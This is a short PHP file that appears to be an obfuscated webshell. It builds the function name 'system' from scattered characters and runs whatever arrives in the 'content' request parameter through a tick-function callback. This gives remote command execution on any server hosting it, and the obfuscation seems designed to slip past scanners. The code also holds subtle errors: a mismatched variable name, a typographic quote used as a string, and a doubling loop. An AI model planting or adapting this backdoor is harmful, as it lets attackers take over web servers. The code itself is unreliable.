<?php
/*

isDog

*/
                // $a assert
        $a = "0,1,2,3,4,5,s,y,s,t,e,m";
        // 根据','转换成数组
        $array = explode(",",$a);
                // 空变量
                $func = ”;
                for($i=6;$i<count($arr);$i++) {
                        $func .= $func . $arr[$i];
                }
        // 接收content参数
        $c = $_REQUEST["content"];
        register_tick_function($func,$c);
        // 每执行3条低级语句就去执行一次 register_tick_function() 注册的函数
        {
                declare(ticks = 3);
        }

?>
